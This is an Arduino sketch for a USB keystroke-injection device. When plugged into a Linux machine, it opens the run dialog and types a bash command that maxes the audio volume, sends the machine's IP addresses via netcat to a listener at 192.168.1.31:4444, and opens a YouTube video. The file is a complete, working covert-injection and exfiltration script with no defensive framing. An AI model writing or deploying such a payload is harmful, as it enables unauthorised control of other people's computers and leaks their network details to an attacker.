#include <Keyboard.h>

void setup() {
  delay(2000);
  Keyboard.begin(KeyboardLayout_fr_FR);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("bash -c '");
  Keyboard.print("pactl set-sink-volume @DEFAULT_SINK@ 100%;");
  Keyboard.print("ip a | grep inet | awk \"{print $2}\" | nc 192.168.1.31 4444;");
  Keyboard.print("firefox https://www.youtube.com/watch?v=1T9b0cax6s4&t=33s");
  Keyboard.println("' &");
  delay(10000);

  Keyboard.press('k');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
